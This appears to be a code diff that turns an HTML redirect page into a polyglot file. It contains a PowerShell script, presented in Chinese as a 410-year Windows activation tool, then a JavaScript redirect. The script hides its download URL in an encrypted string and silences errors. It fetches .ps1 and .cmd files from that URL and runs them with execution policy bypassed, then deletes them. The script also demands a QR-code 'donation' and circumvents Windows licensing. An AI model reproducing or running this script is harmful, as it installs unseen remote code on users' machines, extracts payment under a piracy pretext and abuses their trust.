@@ -1,11 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://gitee.com/dylanbai8/download/releases/download/23.33/donate.ps1">
-    <title>Redirecting...</title>
-</head>
-<body>
-    <p>If you are not redirected, <a href="https://new-url.com">click here</a>.</p>
-</body>
-</html>
+# <script type="text/javascript"> /*
+$WarningPreference = "SilentlyContinue"; $ErrorActionPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $power = (1..16)
+function Decrypt-String { param ( [Parameter(Mandatory=$true)] [string]$EncryptedText, [Parameter(Mandatory=$true)] [byte[]]$Key ); $secureString = $EncryptedText | ConvertTo-SecureString -Key $Key; $plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)); return $plainText }
+
+$kmsHost = "kms.jihuowin.com"; $kmsPort = 1688; $tcpClient = New-Object Net.Sockets.TcpClient; Write-Host ".`n..`n..."
+Write-Host "[ 比永久更久 Windows10/11 系统激活 410年 ]"; $matchYear = (Get-Date).Year + 411; Write-Host "加载中，请等待 ..."
+$shell = "76492d1116743f0423413b16050a5345MgB8AG8ALwB3AHEAVgBRAEgAYgBrAC8AdwBLAG8AZwBqAHMAcABNAHcAdABFAEEAPQA9AHwANQA0AGUANAAzAGIAOABjAGQANABmAGMAMwBlADcANQBjAGEAOAAyADcANQAyAGYAZgBiADMAZABiAGIANAA3ADkAMQBhAGQAMwBiADIAMAA4ADcANQA4ADAAMgBlADgAOAAyADYAZgAwADYANgA2AGQAZgBiADAAYgA4AGIAOAA0ADcAMQAzAGMAZABjADgAZABjADkAOAA1ADAAOQBlAGIAMAA5ADQAMwA2AGYAMQAxAGYAYwBiADcAMwBkADgAZgBmAGMANwA0ADAAOAAxAGYAMwA2AGQANQBiAGYAOABkAGEAYgBiADYANQBkADIAMABkAGEAMAA5ADAAMgBlAGIAZAA1ADkAOAAwADQAYwAwADQAZQBmADAAMwBiADQAOQAyAGQAMwAwADgANAA0AGQANAA2ADQANQA2AGUAMQA2ADMAYgAzAGQAYwBkADEAZQAzADEANQBmADYANQBjADEAMwAzADUAYgA0AGIANQAzADgAZQA5ADQAYgA1AGUAMQAyADUANABjADEAMQBjADQANQA3ADYAMAA3ADcAYQA4AGEAZQBhADMANAA1AGYANAA1AGMANQA0AGUAYgBkAGMANQBlADEAZQBlADEAMAA5AGQAZQA3ADEAMQBiAGIAOQA0ADIAYwAzADgAZABhAGQAMgAxADkAOQA3AGYAYQA="
+try {$asyncResult = $tcpClient.BeginConnect($kmsHost, $kmsPort, $null, $null); if (-not $asyncResult.AsyncWaitHandle.WaitOne(8000)) {Write-Host "检测超时，请更换网络或稍后再试。"; Write-Host "...`n..`n."; return} $tcpClient.EndConnect($asyncResult); Write-Host "检测通过 ..."} catch {Write-Host "检测异常，请更换网络或稍后再试。"; Write-Host "...`n..`n."; return} finally {$tcpClient.Close()}
+
+$DonateCheck = Decrypt-String -EncryptedText $shell -Key $power; $FileURA0 = [System.IO.Path]::GetRandomFileName() + ".ps1"; $FileURB0 = [System.IO.Path]::GetRandomFileName() + ".cmd"; $response_state = Invoke-WebRequest -Uri ${DonateCheck}?state=lock; $state = $response_state.Content.Trim()
+if ($state -ne "unlocked") {Write-Host "排队中，请稍后2分钟再试 ..."; Write-Host "...`n..`n."; return}
+
+$response_pay = Invoke-WebRequest -Uri $DonateCheck; $pay = $response_pay.Content.Trim(); Invoke-WebRequest -Uri ${DonateCheck}?state=fileurc0 -OutFile "$Env:temp\donate300.png"; Invoke-WebRequest -Uri ${DonateCheck}?state=fileurd0 -OutFile "$Env:temp\$FileURA0"; Write-Host "准备完成，扫描弹框二维码打赏后继续 ..."; powershell -ExecutionPolicy Bypass -File "$Env:temp\$FileURA0"; $response_ispay = Invoke-WebRequest -Uri $DonateCheck; $ispay = $response_ispay.Content.Trim()
+if ($pay -eq $ispay) {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "错误，未检测到打赏 (未付款、支付超时)。请稍后再试 ..."} else {$UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=unlock; Write-Host "感谢打赏！执行中，请稍等 (切勿中断脚本，以免订单失效) ..."; Invoke-WebRequest -Uri ${DonateCheck}?state=fileure0 -OutFile "$Env:temp\$FileURB0"; Start-Process -FilePath "$Env:temp\$FileURB0" -Wait; $filePath = "$Env:temp\$FileURB0"; Start-Sleep -Seconds 3; Write-Host "激活期限查询命令：slmgr.vbs /xpr"; if (Test-Path $filePath) {Write-Host "执行异常! 你似乎中断了脚本运行，建议重试!"; Write-Host "您的打赏款，将在24小时内 [原路退回]，感谢支持!"; $UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=breakoff} else {$actResult = cscript.exe /nologo "$env:SystemRoot\System32\slmgr.vbs" /xpr; $Match410 = [regex]::Matches($actResult,'\d{4}'); if ($Match410[0] -and $Match410[0].Value -eq $matchYear) {Write-Host "恭喜，激活成功!"; Write-Host "在弹出窗口中查看激活详情。"; slmgr.vbs /xpr; slmgr.vbs /dlv; start ms-settings:activation; $UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=activated} else {Write-Host "抱歉，似乎不兼容您的版本，激活失败!"; Write-Host "您的打赏款，将在24小时内 [原路退回]，感谢支持!"; $UrlTest = Invoke-WebRequest -Uri ${DonateCheck}?state=actfailed}}}
+Remove-Item -Path @("$Env:temp\$FileURA0", "$Env:temp\$FileURB0", "$Env:temp\donate300.png") -Force; Write-Host "执行完毕，请关闭此窗口。"; Write-Host "...`n..`n."
+  */  </script>
+
+    <script type="text/javascript">
+        window.location.href = "https://jihuowin.com/";
+    </script>
